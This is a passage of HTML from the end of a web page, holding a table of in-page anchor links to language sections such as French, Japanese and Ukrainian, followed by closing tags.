	<td class="externalLink"><a href="#french">French</a></td>
	<td class="externalLink"><a href="#german">German</a></td>
	<td class="externalLink"><a href="#greek">Greek</a></td>
	<td class="externalLink"><a href="#hebrew">Hebrew</a></td>
	<td class="externalLink"><a href="#italian">Italian</a></td>

	</tr></tbody></table><table border="0"><tbody><tr align="center">
	<td class="externalLink"><a href="#japanese">Japanese</a></td>
	<td class="externalLink"><a href="#kazakh">Kazakh</a></td>
	<td class="externalLink"><a href="#korean">Korean</a></td>
	<td class="externalLink"><a href="#polish">Polish</a></td>
	<td class="externalLink"><a href="#portuguese">Portuguese</a></td>
	<td class="externalLink"><a href="#russian">Russian</a></td>
	<td class="externalLink"><a href="#slovak">Slovak</a></td>
	<td class="externalLink"><a href="#spanish">Spanish</a></td>
	<td class="externalLink"><a href="#thai">Thai</a></td>
	<td class="externalLink"><a href="#turkish">Turkish</a></td>
	<td class="externalLink"><a href="#ukrainian">Ukrainian</a></td>
	<td class="externalLink"><a href="#usa">usa</a></td>

</tr></tbody></table>


</td></tr>

</tbody></table>
</form>



</body></html>